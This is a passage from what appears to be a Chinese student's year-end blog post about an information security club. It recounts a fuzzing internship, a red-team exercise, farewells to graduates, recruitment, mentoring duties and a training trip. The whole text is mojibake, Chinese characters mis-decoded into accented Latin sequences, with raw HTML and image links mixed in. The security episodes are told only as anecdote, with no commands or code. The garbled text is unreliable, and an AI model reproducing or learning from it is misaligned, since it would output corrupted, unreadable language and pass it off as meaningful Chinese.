é¡¹ç›®</h2><p>ç¬¬ä¸€æ¬¡è·Ÿå…¬å¸åˆä½œåšé¡¹ç›®ï¼Œç¬¬ä¸€æ¬¡ç­¾åŠ³åŠ¨åˆåŒï¼Œç¬¬ä¸€æ¬¡çº¿ä¸Šå®ä¹ ï¼Œç¬¬ä¸€æ¬¡æ„Ÿå—åˆ°ç°å®ï¼Œç¬¬ä¸€æ¬¡æŒ¨ç¤¾ä¼šçš„æ¯’æ‰“ï¼Œç¬¬ä¸€æ¬¡å®ä¹ èµšé’±ï¼ˆ1500ï¼Œä¹Ÿæˆä¸ºäº† iPad pro çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚</p><p>è¿™ä¹ˆå¤šä¸ªç¬¬ä¸€æ¬¡å †åœ¨ä¸€èµ·ï¼Œè¯´å®è¯æ˜¯æœ‰ç‚¹ç´§å¼ çš„ï¼Œæ¯å‘¨çš„ä¾‹ä¼šéƒ½æ˜¯å”¯å”¯è¯ºè¯ºï¼Œå·¥ä½œå†…å®¹æ¯”è¾ƒç®€å•ï¼Œå¤ç°äº†ä¸€äº›è¢«æµ‹ç¨‹åºçš„å†å²æ¼æ´ï¼Œæ­ winafl æ¥è·‘äº†ä¸€ä¸‹ï¼Œæ‰¾äº†ä¸€ä¸‹è¢«æµ‹ç¨‹åºçš„å†å²ç‰ˆæœ¬ï¼Œå­¦äº†ä¸€äº› fuzz ç›¸å…³çŸ¥è¯†ï¼Œç ”ç©¶æµ‹å‡ºæ¥çš„ bug å¹¶æƒ³åŠæ³•æ‰¹é‡äº§ç”Ÿèƒ½é€ æˆæ­¤ bug æµ‹è¯•ç”¨ä¾‹ï¼Œä»…æ­¤è€Œå·²ï¼Œä½†æ˜¯ fuzz å¯¹æˆ‘æ¥è¯´æ˜¯æ–°ä¸œè¥¿ï¼Œä»¥å‰å¬è¿‡æ²¡æè¿‡ï¼Œä½†æ˜¯è¿˜å¥½æœ‰ sivona å¸ˆå‚… : ) ã€‚æœ€åä»…ä»…æµ‹å‡ºæ¥ä¸€ä¸ª bugï¼Œæµ‹è¯•ç”¨ä¾‹æŠŠç¨‹åºçš„æ ˆç”¨çˆ†æ‰äº†ã€‚</p><p>è™½è¯´åˆè¡·æ˜¯é‡åœ¨å­¦åˆ°ä¸œè¥¿ï¼ˆè™½ç„¶æœ€åå­¦åˆ°çš„ä¸œè¥¿å®Œå…¨æ˜¯è‡ªå·±è‡ªå­¦åˆ°çš„ï¼‰ï¼Œä½†æ˜¯å‹ä»·å‹å·¥æ—¶è¿˜è¢«æ€€ç–‘çœŸæ˜¯è®©äººåˆæ°”åˆæ— å¥ˆï¼Œæœ¬æ¥æŒ–æ´è¿™ç§ä¸œè¥¿å°±æ˜¯æœ‰ä¸€å®šçš„æ—¶é—´æˆæœ¬æµ¸æ²¡ä½†æ˜¯ä¸ä¸€å®šæœ‰å®é™…äº§å‡ºï¼ŒåŠ ä¸Šå¤§å®¶éƒ½è¿˜éœ€è¦ä»˜å‡ºä¸€å®šçš„å­¦ä¹ æˆæœ¬ï¼Œæœ€åæŠ¥ä¸Šå»çš„å·¥æ—¶è¢«çº¿ä¸Šå®ä¹  + ä¸å®é™…äº§å‡ºä¸ç¬¦ä¸ºç†ç”±å‹ä¸‹æ¥ï¼Œè¿˜è¢«è€æ¿æ‰¹è¯„ã€‚</p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%98%BB%E5%98%BB.jpg" alt="" style="zoom:150%;" /><p> sivona å¸ˆå‚…è¯´è¡¨ç¤ºç†è§£ï¼Œç¤¾ä¼šå°±æ˜¯è¿™ä¹ˆç°å®ï¼Œæ¯•ç«Ÿäººå®¶ä¹Ÿæœ‰ç†ç”±ï¼Œçº¿ä¸Šå®ä¹ ä¹Ÿçœ‹ä¸åˆ°æˆ‘ä»¬å®é™…åœ¨å¹²å˜›ï¼ŒäºŒè¿›åˆ¶æ¼æ´æŒ–æ˜æœ¬èº«ä¹Ÿæ˜¯æœ‰ç‚¹çœ‹å¤©èµ‹ï¼Œæ‰¾ 100 ä¸ªäººæŒ–ï¼Œå¯èƒ½è¿˜ä¸å¦‚ä¸€ä¸ªäººçš„è¾“å‡ºé«˜ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/A60403BIEB8QRHXP%60NLRHQX.png"></p><p>ä¸‹åŠå¹´å¬è¯´è¿™å®¶å…¬å¸å·²ç»è·Ÿæ¡‚ç”µè¾¾æˆäº†æ¯”è¾ƒæ·±çš„æ·±åº¦åˆä½œï¼›å¬è¯´è¿™å®¶è€æ¿éå¸¸å–œæ¬¢ç”¨æ¡‚ç”µçš„å­¦ç”Ÿï¼Œç†ç”±æ˜¯å¥½ç”¨ä¸è´µï¼›å¬è¯´ä¸‹åŠå¹´åˆæœ‰æ–°çš„é¡¹ç›®æ‰¾äº†ä¸€äº›å­¦å¼Ÿå­¦å¦¹å»ã€‚æˆ‘æ²¡æœ‰å‚ä¸ï¼Œä¹Ÿè·Ÿæˆ‘æ²¡å•¥å…³ç³»äº†ï¼Œå› ä¸ºè¿™æ—¶çš„æˆ‘å·²ç»æ˜¯ä¸€ä¸ªè€ƒç ”ğŸ•äº†ã€‚</p><h2 id="å¹¿è¥¿æŠ¤ç½‘"><a href="#å¹¿è¥¿æŠ¤ç½‘" class="headerlink" title="å¹¿è¥¿æŠ¤ç½‘"></a>å¹¿è¥¿æŠ¤ç½‘</h2><p>è¿™æ¬¡çš„æˆç»©ä¸å¤ªå¥½ï¼Œæ„Ÿè§‰å°±æ˜¯ä¸€å¹´æ¯”ä¸€å¹´éš¾æ‰“ï¼Œèƒ½è¿›å»å†…ç½‘çš„é˜Ÿä¼ç›´æ¥å†…ç½‘é¨æ¸¸ï¼Œçªç ´ä¸äº†çš„å°±åªèƒ½åå¤§ç‰¢æ‘†å¤§çƒ‚ï¼Œæœ€åå¥½ä¸å®¹æ˜“ sql æ¢­åˆ°ä¸€ä¸ªè¿›å»äº†ï¼Œå› ä¸ºä¸ä¼šå†™å…æ€é©¬ æ€è·¯å°±åˆæ–­æ‰äº†ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118020854.png" alt="ç²‰é¥ºçœŸå¥½åƒ"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118022512.png" alt="èåœå¹²çœŸéš¾åƒ"></p><p>å±äºæ˜¯æ•…åœ°é‡æ¸¸äº†ï¼Œå®šçš„é…’åº—è·Ÿå»å¹´æ˜¯åŒä¸€å®¶ï¼Œç”šè‡³ä¸»åŠæ–¹å‘çš„é¥­éƒ½è·Ÿå»å¹´ä¸€æ¨¡ä¸€æ ·ï¼ˆå°¤å…¶æ˜¯å—å®é‚£ä¸å’¸ä¸æ·¡çš„èåœå¹²ï¼‰ï¼Œä½†æ˜¯ä»Šå¹´æ˜¯è·Ÿå­¦å¼Ÿå­¦å¦¹ä¸€èµ·ï¼Œæœ€åç»“æŸçš„æ—¶å€™å¤§å®¶è¿˜ä¸€èµ·æµ·åº•æï¼ŒæŒºå¼€å¿ƒçš„ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118021643.png" alt="è·Ÿå­¦å¼Ÿæ°çƒ§çƒ¤"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118021829.png" alt="æœ€åä¸€å¤©æµ·åº•æ"></p><p>æœŸé—´è¿˜è·Ÿåœ¨è¥¿å¤§çš„é«˜ä¸­åŒå­¦å°èšäº†ä¸€åœº</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118021555.png" alt="è€å‹èšé¤"></p><p>æ­¤å¤–è¿˜è®¤è¯†äº†åœ¨æ¡‚æ—ç½‘å®‰çš„å­¦é•¿ï¼Œå’Œæ¢¦æå…‰è’‹å­¦é•¿åƒé¥­è¿˜è§åˆ°äº†åä¼šæ›¾ç»çš„ ming ç¥ï¼Œè·Ÿå‰è¾ˆä»¬èŠå¤©ã€è®¨è®ºä¹Ÿå­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ï¼Œæ€»çš„æ¥è¯´è¿˜æ˜¯å¾ˆæœ‰æ„ä¹‰çš„ã€‚</p><p>è·Ÿæ‰«åœ°åƒ§å­¦é•¿ä¹°å½©ç¥¨è¿˜ä¸­äº†ä¸å°‘ï¼Œè™½ç„¶æœ€åéƒ½æ˜¯äºï¼Œä½†æ˜¯å¥½æ­¹ä¸­è¿‡å¥–ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118022657.png" alt="å¥½è¿è¿è¿"></p><h2 id="ç¦»åˆ«æ—¶åˆ»"><a href="#ç¦»åˆ«æ—¶åˆ»" class="headerlink" title="ç¦»åˆ«æ—¶åˆ»"></a>ç¦»åˆ«æ—¶åˆ»</h2><p>æŠ¤ç½‘å›æ¥å°±åˆåˆ°äº†æ¯å¹´çš„æ¯•ä¸šé€åˆ«å­¦é•¿å­¦å§çš„ç¯èŠ‚äº†ï¼Œä»Šå¹´æ¯•ä¸šäº†ä¸€å¯¹å­¦é•¿å­¦å§ï¼Œè±†å­çˆ¹å»äº†èŠå‚ï¼Œè±†å­å¦ˆå»äº†é¹…å‚ï¼Œå°è±†å­ä¸€åº¦æˆä¸ºè´µåèº«ä»·æœ€é«˜</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118023116.png" alt="å¯çˆ±çš„å°è±†å­"></p><p>è®°å¾—å¾ˆæ¸…æ¥šçš„æ˜¯é‚£å¤©æœ‰äººç©å¯†å®¤é€ƒè„±ä¸­é€”è¢«å“å¾—ä¸è¡Œäº†å«æ’¤é€€ï¼Œè®°å¾—é‚£å¤©æ¾³é—¨é…’å®¶çš„é¥­èœå¾ˆå¥½åƒ åƒçš„å¾ˆé¥±ï¼Œè®°å¾—é‚£å¤© KTV å¤§å®¶ä¸€èµ·å”±æ­Œå¾ˆå¼€å¿ƒï¼Œä¸è¿‡è®°å¾—æœ€æ¸…æ¥šçš„æ˜¯æœ€åè·Ÿå­¦å¼Ÿå’Œå­¦å§å»å±‹é¡¶å–é…’ï¼Œå­¦å¼Ÿå–é†‰äº†è·Ÿæˆ‘ä¸€ç›´è¯´è¦åŠªåŠ›æ‰“ CTFï¼Œæ˜å¹´è¦è¿›å¼ºç½‘æ¯çº¿ä¸‹ï¼Œè¿˜è¯´æ‹’ç»äº†æ‰¾ä¸Šé—¨æ¥çš„ pyï¼Œ2021 æœ€æ„ŸåŠ¨æ—¶åˆ»è«è¿‡äºæ­¤ï¼Œå½“æ—¶å·®ç‚¹å°±å“­äº†ï¼Œæœ€åä»æ ¡é—¨å£ä¸¤ä¸ªäººä¸€æ­ªä¸€å€’ç›¸äº’æ€æ‰¶å›å»è¿›é—¨å°±å€’ä¸‹ æƒ³æƒ³å°±å¥½ç¬‘ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%BF%8D%E7%AC%91.jpg"></p><p>ä¸çŸ¥ä¸è§‰å°±æˆäº†åä¼šçš„è€äººï¼Œä»Šå¹´å…­ä¸ƒæœˆä»½åˆè¦é€èµ° 18 çº§çš„å¸ˆå‚…ä»¬ã€‚æ¯æ¬¡éƒ½æ˜¯æ‚„æ‚„çš„å¤§å®¶å°±èµ°äº†ï¼Œç¬¬ä¸€æ¬¡é€ 16 çº§çš„æ—¶å€™å¤§ä¸€ï¼Œä¸æ‡‚æ€ä¹ˆé¢å¯¹ï¼Œä¸€ä¸ªäºº emo äº†å¾ˆä¹…ï¼Œç°åœ¨æƒ³æƒ³ï¼Œæ¯•ä¸šäº†åˆæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œä»–ä»¬æ°¸è¿œéƒ½æ˜¯æˆ‘çš„å¸ˆå‚…è·Ÿå­¦é•¿å­¦å§ï¼Œä¸ç®¡åœ¨å“ªé«˜å°±ï¼Œæˆ‘ä»¬å„è‡ªåŠªåŠ›ï¼Œå³°é¡¶ç›¸è§ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%93%AD%E5%93%AD.png"></p><h1 id="ä¸‹åŠå¹´"><a href="#ä¸‹åŠå¹´" class="headerlink" title="ä¸‹åŠå¹´"></a>ä¸‹åŠå¹´</h1><p>ä¸‹åŠå¹´å­¦æŠ€æœ¯çš„æ—¶é—´æ¯”è¾ƒå°‘ï¼ŒåŸºæœ¬æ˜¯æ™šä¸Šæ‰æœ‰ç©ºè‡ªå·±çœ‹çœ‹ä¹¦å’Œè§†é¢‘å¯¹ç€è°ƒä¸€è°ƒï¼Œæ²¡æœ‰å¤ªå¤šæ”¶è·ï¼Œä¸€æ˜¯å› ä¸ºè¿™ä¸ªæ—¶å€™çš„æˆ‘å·²ç»å†³å®šè€ƒç ”äº†ï¼Œçº ç»“äº†å¾ˆä¹…æ²¡æƒ³åˆ°å†³å®šä¸‹æ¥è€ƒç ”åªæ˜¯ä¸€ç¬é—´çš„äº‹æƒ…ï¼Œä¸€éƒ¨åˆ†æ—¶é—´èŠ±åœ¨äº†æ”¶é›†è€ƒç ”èµ„æ–™å’Œå¤ä¹ é«˜æ•°ä¸Šï¼ŒäºŒæ˜¯å› ä¸ºå½“äº†åŠ©ç­ï¼ˆåŠ©ç†ç­ä¸»ä»»ï¼‰å¾ˆå¿™ã€‚</p><h2 id="è·Ÿç€å§šè€å¸ˆæœ‰é¥­åƒ"><a href="#è·Ÿç€å§šè€å¸ˆæœ‰é¥­åƒ" class="headerlink" title="è·Ÿç€å§šè€å¸ˆæœ‰é¥­åƒ"></a>è·Ÿç€å§šè€å¸ˆæœ‰é¥­åƒ</h2><p>ç”Ÿæ´»æ€»æ˜¯è¿™ä¹ˆå¤šå§¿å¤šå½©ï¼Œå§šè€å¸ˆ yyds</p><p>æ·»ç¦æ¥¼åƒè‡ªåŠ©ç´ é£Ÿ</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118030835.png" alt="æ— åé£æ™¯"></p><p>å®¶ä¸­å¹²é¥­ + æ¡‚æ—åšç‰©é¦†ä¸€æ—¥æ¸¸</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118031000.png" alt="æ¡‚æ—å¸‚åšç‰©é¦†å¤§é—¨"></p><p>å®¶ä¸­å¹²é¥­å‘Šåˆ«æš‘å‡</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118031050.png" alt="å¾®å§åšçš„èœ"></p><p>å®¶ä¸­åŒ…é¥ºå­ + å¹²é¥­å–œè¿æ–°ç”Ÿå’Œæ–°å­¦æœŸ</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118031235.png" alt="å¤§å®¶ä¸€èµ·åŒ…çš„é¥ºå­"></p><p>è¥¿å¤§æ¯”èµ›è¯·å¤§ä¼™åƒæ—¥å¼çƒ¤è‚‰é¥­</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118031433.png" alt="éå¸¸å¥½åƒçš„çƒ¤è‚‰é¥­"></p><h2 id="æ‹›æ–°"><a href="#æ‹›æ–°" class="headerlink" title="æ‹›æ–°"></a>æ‹›æ–°</h2><p>é¦–å…ˆæ”¾ä¸Šè´µåçš„ 2021 æ‹›æ–°å®£ä¼ ç‰‡ï¼Œç‚¹å‡»ç›´è¾¾ï¼š<a href="https://www.bilibili.com/video/BV1V44y1879A">ã€æ¡‚æ—ç”µå­ç§‘æŠ€å¤§å­¦ã€‘ä¿¡æ¯å®‰å…¨åä¼š2021æ‹›æ–°å®£ä¼ è§†é¢‘</a></p><iframe src="//player.bilibili.com/player.html?aid=975227132&bvid=BV1V44y1879A&cid=397554178&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><p>ä»Šå¹´æ‹›åˆ°äº†ä¸‰ä¸ªå­¦å¼Ÿä¸¤ä¸ªå­¦å¦¹ï¼Œæ„Ÿè§‰éƒ½æŒºèªæ˜çš„ï¼Œäººä¹ŸæŒºå¥½çš„ï¼Œå°±æ˜¯æœ‰ç‚¹å–œæ¬¢æ‘†çƒ‚ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%BC%80%E6%91%86.png"></p><h2 id="åŠ©ç­ç”Ÿæ´»"><a href="#åŠ©ç­ç”Ÿæ´»" class="headerlink" title="åŠ©ç­ç”Ÿæ´»"></a>åŠ©ç­ç”Ÿæ´»</h2><p>å½“åŠ©ç­æ˜¯å¤§ä¸€å°±æœ‰çš„æƒ³æ³•ï¼Œç°åœ¨ä¹Ÿç»ˆäºè¿‡äº†é¢è¯•å½“ä¸Šäº†ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆæƒ³è¦å½“åŠ©ç­å‘¢ï¼Ÿ</p><p>ä¸€æ˜¯å—æˆ‘å½“æ—¶åŠ©ç­çš„å½±å“ï¼Œè§‰å¾—è¿™ç¡®å®æ˜¯ä»¶æ¯”è¾ƒæœ‰æ„ä¹‰çš„äº‹æƒ…ï¼ŒäºŒæ˜¯è½¬ä¸“ä¸šæ¥ä¸‰é™¢ä»¥åæ²¡æœ‰äº¤åˆ°ä¿¡å®‰ä¸“ä¸šå¤–çš„æœ‹å‹ï¼Œè¿™æ˜¯ä¸ªè®¤è¯†æ–°æœ‹å‹çš„å¥½æœºä¼šã€‚</p><p>é‚£ä¹ˆå®é™…æƒ…å†µå¦‚æˆ‘æ‰€æ„¿äº†å—ï¼Ÿ</p><p>åªèƒ½è¯´å¦‚æ„¿äº† 90 %ï¼Œå…¶å®å—ç½‘ç»œä¸Šæ‘†çƒ‚å’Œèººå¹³é£æ°”çš„å½±å“ï¼ŒåŠ ä¸Šç°åœ¨å„ä¸ªå®¶åº­é‡Œé¢ç”Ÿæ´»æ¡ä»¶å¥½äº†ï¼Œéƒ½æ˜¯å°‘çˆ·å°å§ï¼Œç°åœ¨çš„å¹´è½»äººçœŸçš„æŒºéš¾å¬è¿›å»åˆ«äººè¯´çš„è¯çš„ã€‚ä¸è¿‡å¥½åœ¨æˆ‘æœ¬æ¥ä¹Ÿæ²¡æ‰“ç®—å»è¯´å¤ªå¤šå¤§é“ç†ï¼Œç›¸æ¯”è¾ƒè®©å¤§å®¶â€œå£æœâ€ï¼Œæˆ‘æ›´å¸Œæœ›å¤§å®¶â€œå¿ƒæœâ€ï¼Œæ‰€ä»¥çŠ¯é”™ã€æŒ‚ç§‘ã€é€ƒè¯¾é€ƒæ™šè‡ªä¹ æˆ‘éƒ½ä¸è¯´ï¼Œç›¸æ¯”è¾ƒå…¶ä»–ç­ä¹Ÿå¾ˆå°‘æŠ“ï¼Œæˆ‘åªä¼šè·Ÿå¤§å®¶è¯´æ¸…æ¥šå¥–æƒ©æƒ…å†µï¼Œæ¯•ç«Ÿéƒ½æ˜¯æˆå¹´äººäº†ï¼Œåšäº‹æƒ³ä¸æ¸…æ¥šæ²¡å…³ç³»ï¼ŒçŠ¯é”™æŒ¨å¼ã€æ‰¿æ‹…åæœäº†å°±çŸ¥é“å¸å–æ•™è®­äº†ã€‚è€Œèººå¹³è¿™ä¸€ç‚¹è®©æˆ‘æ„Ÿè§¦æœ€æ·±çš„æ˜¯åœ¨ä¸€æ¬¡å…¶ä»–ç¤¾å›¢èšé¤ä¸Šï¼Œé—®æ–°æ¥çš„å‡ ä¸ª 21 çº§æ–°ç”Ÿä»¥åæ‰“ç®—åšä»€ä¹ˆå·¥ä½œï¼Œå‡ ä¹éƒ½æ˜¯å›ç­”æƒ³è€ƒå…¬åŠ¡å‘˜æˆ–è€…è€ƒç ”ï¼Œæå°‘æ•°æƒ³è¿›å¤§å‚ï¼Œæ„Ÿè§‰è·Ÿæˆ‘å¤§ä¸€é‚£å¹´æ˜¯ç›¸åçš„æƒ…å†µã€‚</p><p>å¯¹æˆ‘å¸¦è¿‡çš„ä¸¤ä¸ªç­æ¥è¯´ï¼Œè‡ªæˆ‘æ„Ÿè§‰æ˜¯å°½å¿ƒå°½åŠ›äº†ï¼Œèƒ½åšçš„èƒ½è¯´çš„éƒ½åšäº†è¯´äº†ï¼Œè™½ç„¶è¿˜æ˜¯æ²¡å•¥åé¦ˆä¹Ÿä¸€å †äººæŒ‚ç§‘æ‘†çƒ‚ï¼Œåªèƒ½æ˜¯å¸Œæœ›å¤§ä¼™æœ‰ä¸€å¤©ä¼šçªç„¶å¼€çªå§ï¼Œåæ­£ä¸‹ä¸ªå­¦æœŸè‚¯å®šæ˜¯å…¨èº«å¿ƒæŠ•å…¥è€ƒç ”äº†ï¼Œè‡ªç„¶æ˜¯æ²¡å¤ªå¤šæ—¶é—´ç®¡äº†ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/emo.gif"></p><p>æƒ³è®¤è¯†æ–°æœ‹å‹å€’æ˜¯æŒºæˆåŠŸï¼Œå½“åŠ©ç­ä»¥åè®¤è¯†äº†å¾ˆå¤šåŒçº§çš„â€œåŒäº‹â€ï¼Œè·¨å¹´è¿˜æ”¶åˆ°äº†ç¤¼ç‰©ï¼ŒæŒºå¼€å¿ƒçš„ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118034749.png" alt="è·¨å¹´"></p><h2 id="æ·±å¤œå¥‡é‡"><a href="#æ·±å¤œå¥‡é‡" class="headerlink" title="æ·±å¤œå¥‡é‡"></a>æ·±å¤œå¥‡é‡</h2><blockquote><p>2022.1.16 æ›´æ–° ï¼Œè¿™æ˜¯ä¸€æ®µé›¶ç¢è®°å¿†ï¼Œä½†æ˜¯äº‹åä¹Ÿæ€è€ƒäº†è›®ä¹…</p></blockquote><p>æŸä¸€å¤©å›¢ä½“è¾…å¯¼åè·Ÿæ–°å“¥å¸¦å°ç­å»åè¡—åƒå®µå¤œå–é…’ï¼ŒåäºŒç‚¹å¤šæ‰“ç®—èµ°çš„æ—¶å€™ï¼Œçªç„¶æœ‰ä¸€å¯¹æƒ…ä¾£æŠŠæˆ‘ä»¬æ‹¦ä½ï¼Œé‚£ä¸ªå¥³å­©å­é†‰å¾—èƒ¡è¨€ä¹±è¯­ç¼©åœ¨ä¸€ä¸ªåº—é“ºé—¨å£çš„è§’è½ï¼Œç”·ç”Ÿæ±‚æˆ‘ä»¬é€é‚£å¥³å­©å­å›å®¿èˆã€‚æœ¬æ¥æ˜¯ä¸æ‰“ç®—å¤šç®¡é—²äº‹çš„ï¼Œä½†æ˜¯ç¡®å®å¤œæ·±äººé™åº—é“ºéƒ½å…³é—¨äº†ï¼Œæœ‰ç‚¹ä¸å®‰å…¨ï¼Œæƒ³ç€èƒ½åšç‚¹å¥½äº‹å°±åšç‚¹å¥½äº‹ï¼Œå°±ç­”åº”äº†ã€‚</p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E8%A2%AB%E8%BF%AB%E8%90%A5%E4%B8%9A.gif" alt="" style="zoom: 67%;" /><p>æœ€ç¦»è°±çš„æ¥äº†ï¼Œä¸€è·¯ä¸Šè¿™ä¸ªå¥³å­©å­å°±ä¸€ç›´è¯´é‚£ç”·çš„æ€ä¹ˆæ€ä¹ˆä¸å–œæ¬¢å¥¹ï¼Œä¸å…¬å¼€ä¹Ÿå¯¹ä¸¤ä¸ªäººçš„äº‹ä¹Ÿä¸ä¸Šå¿ƒï¼Œéå¸¸å†·æ¼ ï¼Œè¿˜è¯´è‡ªå·±æ˜¯å¾ˆå‘å¾®å¾ˆå‘å¾®çš„èˆ”ç‹—ï¼Œåªæœ‰å–é†‰äº†æ‰æ•¢è¯´è¿™äº›è¯ï¼Œé‚£ç”·ç”Ÿå°±è·Ÿç€åé¢èµ°ï¼Œä¼°è®¡ä¹Ÿæ˜¯å–äº†ç‚¹ï¼Œä¸æ€ä¹ˆè¯´è¯ï¼Œå°±ä¸€ç›´è¯´â€œä»Šæ™šä½ å–é†‰äº†ä½ è¯´ä»€ä¹ˆæˆ‘éƒ½ä¸ä¼šæ”¾åœ¨å¿ƒä¸Šçš„â€ã€‚ä¸€å¼€å§‹æ„Ÿè§‰åƒæ˜¯æ¸£ç”·éª—äº†å°å¦¹å¦¹çš„æ„Ÿæƒ…ï¼Œä½†æ˜¯ä¸¤ä¸ªäººè¶Šè¯´è¶Šå¤šï¼Œå¥³å­©å­è¯´è‡ªå·±å‰å‡ å¤©æ‰åˆšè·Ÿå¦ä¸€ä¸ªå­¦é•¿åˆ†æ‰‹ï¼Œè·Ÿå­¦é•¿åœ¨ä¸€èµ·å¾—å¾ˆå¿«åˆ†æ‰‹ä¹Ÿå¾ˆå¿«ï¼Œ ä»¥ä¸ºå¯¹æ–¹å¾ˆå–œæ¬¢å¥¹ç»“æœå‘ç°æ˜¯åœ¨éª—å¥¹æ„Ÿæƒ…ï¼Œåˆ†æ‰‹ååˆé©¬ä¸Šè·Ÿç°åœ¨è¿™ç”·ç”Ÿåœ¨ä¸€èµ·äº†ä¸€ä¸ªæ˜ŸæœŸã€‚ä¸€é—®å¹´çº§ï¼Œå‘ç°ä¸¤ä¸ªéƒ½æ˜¯å¤§ä¸€åˆšæ¥çš„å°å±å­©ï¼Œè¿˜æ˜¯åŒç­åŒå­¦æ¥çš„ï¼Œåˆšå¤§ä¸€å°±å–é…’åˆ°åŠå¤œï¼Œæè¿™ç§äº‹æƒ…ï¼Œè¦æ˜¯æˆ‘å¸¦çš„æ–°ç”Ÿæˆ‘é«˜ä½å¾—æ•´ä¸¤å¥ã€‚</p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E7%A5%9E%E7%BB%8F%E7%97%85.jpg" alt="" style="zoom:67%;" /><p>æœ€åèµ°åˆ°å®¿èˆé—¨å£ï¼Œè¿™ä¸¤ä¸ªäººçªç„¶è¯´è¦è°ˆè°ˆå¿ƒï¼Œè·‘å®¿èˆé—¨å£çš„åœè½¦åœºæ‰¾ä¸ªåœ°æ–¹åäº†ä¸‹æ¥å°±å«æˆ‘ä»¬èµ°ï¼Œæˆ‘ä»¬ç›´æ¥å½“åœºå¼‚æˆ–ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼ŸåŠ ä¸Šæœ¬æ¥è·Ÿæ–°å“¥ä¹Ÿå–äº†ç‚¹é…’ï¼Œå¬åˆ°åé¢æ„Ÿè§‰æ²¡æ„æ€äº†ï¼Œå°±æ²¡æ‰“ç®—ç»§ç»­ç®¡ä»–ä¿©ï¼Œæ‰«äº†ä¸ªè½¦æºœäº†ã€‚</p><blockquote><p>é‚£ä¹ˆä¸ºä»€ä¹ˆè¿™äº‹ä¼šè®©æˆ‘è‹¥æœ‰æ‰€æ€å‘¢</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E8%8B%A5%E6%9C%89%E6%89%80%E6%80%9D.png"></p><p>ç¬¬ä¸€æ˜¯æˆ‘å¯¹èˆ”ç‹—èƒ½æœ‰å…±æƒ…ï¼Œæ„Ÿè§‰è¿™å¥³å­©å­æŒºå¯æ€œçš„ï¼Œç¬¬äºŒæ˜¯è§‰å¾—åˆšæ¥å¤§å­¦çš„æ–°ç”Ÿï¼Œæœ¬æ¥æœ‰æ›´å¤šå¥½ç©çš„äº‹æƒ…ï¼Œéå¾—æ²‰è¿·è°ˆæ‹çˆ±ï¼Œè¿˜æå¾—è¿™ä¹ˆç‹¼ç‹ˆï¼Œå¥½å¥½å­¦ä¹ ä¸é¦™å—ï¼Œå‚åŠ ç‚¹ç¤¾å›¢ä¸å¥½ç©å—ï¼Œå‡ºå»åƒç‚¹å¥½çš„åœ¨æ¡‚æ—ç©ç©æ™¯ç‚¹ä¸èˆ’æœå—ï¼Œ<del>é«˜æ•°å­¦ä¼šäº†å—</del>ï¼Ÿç¬¬ä¸‰å‘ç°ç°åœ¨è°ˆè¿™ç§å¿«é¤æ‹çˆ±å®åœ¨æ˜¯å¤ªå®¹æ˜“ï¼Œå¥½åƒæ„Ÿæƒ…çªç„¶ä¸€ä¸‹å­å°±å˜å¾—å»‰ä»·äº†ï¼Œå”‰ã€‚</p><p>åæ¥è¿˜åæ€äº†ä¸€ä¸‹è‡ªå·±çš„æ‹çˆ±è§‚ï¼Œæ¯•ç«Ÿæ—¶ä¸æ—¶ä¹Ÿä¼šåœ¨æŸä¸ªæ·±å¤œ emo ä¸€ä¸‹å­ã€‚</p></blockquote><h2 id="å¸ˆå¤§ä¹‹æ—…"><a href="#å¸ˆå¤§ä¹‹æ—…" class="headerlink" title="å¸ˆå¤§ä¹‹æ—…"></a>å¸ˆå¤§ä¹‹æ—…</h2><p>ctfshow å¼€ç¯å¢ƒé‡å¤æ‰“åŒä¸€é“é¢˜ + ç»ƒä¹ è¾“ sqlmap æŒ‡ä»¤é€Ÿåº¦ï¼Œæ…¢çš„ç½šä¿¯å§æ’‘ å¿«çš„å¥–åŠ± 100 å— + å¤å¤©å…¨èº«å†›è®­æœ + å®¾é¦†å˜å®¿èˆï¼ˆæ— åºŠä¸Šç”¨å“ï¼‰ã€‚</p><p>çº¯çº¯åç‰¢å‡ å¤©ï¼Œä¸æƒ³è¿‡å¤šè¯„ä»·ï¼Œåªèƒ½è¯´å¸ˆå¤§çš„å¦¹å¦¹çœŸå¥½çœ‹ï¼Œé£Ÿå ‚çœŸå¥½åƒï¼Œæ ¡å›­çœŸå¤§ï¼Œçºªå¿µå“æœ‰ç‚¹è´µã€‚</p><h2 